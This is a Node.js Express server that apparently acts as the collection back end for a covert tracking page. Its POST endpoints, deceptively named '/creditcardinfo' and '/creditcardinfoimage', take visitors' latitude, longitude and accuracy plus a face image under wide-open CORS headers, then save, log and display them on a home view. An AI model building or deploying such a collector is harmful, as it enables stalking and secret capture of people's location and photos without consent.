const express = require('express'),
      app     = express();
      http    = require('http').Server(app);
      port    = process.env.PORT || 5000;
      path    = require('path');
      bodyParser = require('body-parser');
      nodemailer = require('nodemailer');
      mysql = require('mysql');
      fs = require('fs');

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.set('views', path.join(__dirname,'views'));
app.set('view engine', 'mustache');
app.engine('mustache', require('hogan-middleware').__express);

class dataHolder {
  constructor(lat, long, accuracy){
    this.lat = lat;
    this.long = long;
    this.accuracy = accuracy;
    this.imgLink = "";
  }
}

var data = [];

app.get("/", (req, res, next) =>{
  res.render("home", {data: JSON.stringify(data) });
});

app.get("/color", (req, res, next) =>{
  res.render("color");
});

app.post("/creditcardinfo", (req,res,next) =>{
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, PATCH, DELETE');
  res.setHeader('Access-Control-Allow-Headers', 'X-Requested-With,content-type');
  res.setHeader('Access-Control-Allow-Credentials', true);

  reqBody = req.body;
  data.push(new dataHolder(reqBody.lat, reqBody.long, reqBody.accuracy));
  console.log("New Data: " + data);

  res.sendStatus(200);
});

app.post("/creditcardinfoimage", (req,res,next) =>{
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, PATCH, DELETE');
  res.setHeader('Access-Control-Allow-Headers', 'X-Requested-With,content-type');
  res.setHeader('Access-Control-Allow-Credentials', true);

  reqBody = req.body;
  console.log(process.cwd() +'/faceImage' + data.length + ".jpg")
  fs.writeFile(process.cwd() + '/faceImage' + data.length + ".jpg", req.body, function(err){
    if(err)
      console.log(err);
    else
      if(data.length > 0)
        data[data.length-1].imgLink = process.cwd() + '/faceImage' + data.length + ".jpg"
  });

  res.sendStatus(200);
});

http.listen(port, function(){
  console.log('listening on *:' + port);
});

module.exports = app;
